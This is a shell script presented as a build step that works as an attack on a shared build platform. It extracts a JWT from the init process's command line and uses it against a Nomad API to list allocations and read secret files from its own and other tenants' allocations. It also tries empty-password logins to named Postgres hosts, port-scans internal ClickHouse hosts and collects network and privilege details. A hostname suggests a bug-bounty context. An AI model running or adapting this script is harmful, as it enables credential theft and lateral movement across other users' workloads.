#!/bin/sh
exec > /build_output.txt 2>&1
echo "=== BUILD R43 ==="
date

# 1. PID 1 cmdline - extract JWT
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep -A1 'registry-auths' | tail -1 | python3 -c "
import sys,json
try:
    data=json.loads(sys.stdin.read())
    print(data[0]['password'])
except: pass
" 2>/dev/null)
echo "JWT_LEN=${#JWT}"

# 2. Full PID1 cmdline
echo "--- PID1 ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | head -50
echo "--- END ---"

# 3. Extract alloc ID from JWT
ALLOC=$(echo "$JWT" | python3 -c "
import sys,json,base64
try:
    token=sys.stdin.read().strip()
    parts=token.split('.')
    payload=json.loads(base64.b64decode(parts[1]+'=='))
    print(json.dumps(payload,indent=2))
except: pass
" 2>/dev/null)
echo "JWT_PAYLOAD=$ALLOC"

N=https://169.254.1.2:4646
ALLOC_ID=$(echo "$ALLOC" | python3 -c "import sys,json; print(json.load(sys.stdin).get('nomad_allocation_id',''))" 2>/dev/null)

# 4. Nomad - list ALL allocations (quick)
echo "--- ALLOCS ---"
curl -sk --connect-timeout 3 "$N/v1/allocations?per_page=100" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for a in data:
      print(f\"ID={a.get('ID','')} Job={a.get('JobID','')} NS={a.get('Namespace','')} Status={a.get('ClientStatus','')} Task={a.get('TaskGroup','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

# 5. Read our own secrets
echo "--- OWN SECRETS ---"
for f in secrets/run.env secrets/build.env local/nomad_token secrets/nomad.env; do
  echo "==$f=="
  curl -sk --connect-timeout 2 "$N/v1/client/fs/cat/$ALLOC_ID?path=$f" -H "Authorization: Bearer $JWT" 2>&1 | head -c 500
  echo
done

# 6. Try ALL other alloc secrets (only from allocs list, not metrics)
echo "--- CROSS-ALLOC ---"
curl -sk --connect-timeout 3 "$N/v1/allocations?per_page=100" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  for a in json.load(sys.stdin):
    print(a.get('ID',''))
except: pass
" 2>/dev/null | while read AID; do
  [ -z "$AID" ] && continue
  [ "$AID" = "$ALLOC_ID" ] && continue
  for f in secrets/run.env secrets/build.env; do
    resp=$(curl -sk --connect-timeout 2 "$N/v1/client/fs/cat/$AID?path=$f" -H "Authorization: Bearer $JWT" 2>&1)
    if ! echo "$resp" | grep -qE "Permission denied|resource not found|no such file|Unexpected response"; then
      echo "HIT $AID $f:"
      echo "$resp" | head -c 500
      echo
    fi
  done
done

# 7. Falcon PG from build network
echo "--- FALCON PG ---"
for host in 132.145.163.127 10.1.47.111; do
  echo "== $host =="
  nc -zv -w 2 $host 12691 2>&1
  PGPASSWORD="" psql "host=$host port=12691 dbname=defaultdb sslmode=require user=avnadmin connect_timeout=2" -c "SELECT 1" 2>&1 | head -3
  PGPASSWORD="" psql "host=$host port=12691 dbname=defaultdb sslmode=disable user=avnadmin connect_timeout=2" -c "SELECT 1" 2>&1 | head -3
done

# 8. Try ClickHouse from internal network
echo "--- CLICKHOUSE INTERNAL ---"
for host in falcon-ch-bugcrowdninja-02b2.c.aivencloud.com 10.0.0.0 10.0.0.1 10.0.0.7; do
  for port in 28319 28320 9000 8123; do
    (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "OPEN: $host:$port"
  done
done

# 9. Network info
echo "--- NET ---"
ip addr 2>/dev/null | head -20
ip route 2>/dev/null | head -10
cat /etc/resolv.conf 2>/dev/null
cat /etc/hosts 2>/dev/null

# 10. Capabilities
echo "--- CAPS ---"
cat /proc/self/status 2>/dev/null | grep -i cap
id

echo "=== BUILD DONE ==="
